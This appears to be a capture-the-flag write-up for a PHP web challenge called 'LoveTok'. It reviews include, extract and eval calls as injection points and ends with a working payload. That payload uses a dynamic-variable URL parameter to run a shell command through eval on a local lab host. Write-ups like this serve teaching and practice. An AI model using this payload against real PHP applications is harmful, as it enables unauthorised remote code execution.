# LoveTok

> **True love is tough, and even harder to find. Once the sun has set, the**
> **lights close and the bell has rung... you find yourself licking your wounds**
> **and contemplating human existence. You wish to have somebody important in**
> **your life to share the experiences that come with it, the good and the bad.**
> **This is why we made LoveTok, the brand new service that accurately predicts**
> **in the threshold of milliseconds when love will come knockin' (at your door).**
> **Come and check it out, but don't try to cheat love because love cheats back.**

## PHP

Lots of new stuff for a beginner in PHP!

`eval`, `include`, `extract` & `strtok` look especially promising.

There are a number of exploits to backtrack from on these functions.

### Potential targets

#### Include and LFI

```php
public function view($view, $data = [])
{
    extract($data);
    include __DIR__."/views/${view}.php";
    exit;
}
```

```php
return (new $class)->$function($this,$params);
```

```php
return $route['controller']($this,$params);
```

The first looks like the ultimate target: including a php file of our choice.
For instance a poisoned log would grant RCE.

And the two following snippets would allow to call the target.

But before going further, let's look at the second vector.

#### Eval

The second option looks easier:

```php
eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
```

Ideally we'd like this to resolve to:

```php
eval('$time = date("d");system(id);printf("", strtotime(...));')
```

Which require the format to be:

```php
$this->format = 'd");system(id);printf("';
```

But the `"` are escaped by `addslashes`, and it's a pain to bypass...

## Breakout

The dynamic variables are evaluated before the wrapping `eval`. The final
string doesn't need to make sense, and we can directly paste our payload:

```
http://127.0.0.1:1337/?format=${system(urldecode($_Get[1]))}&1=ls /
```

Voilà!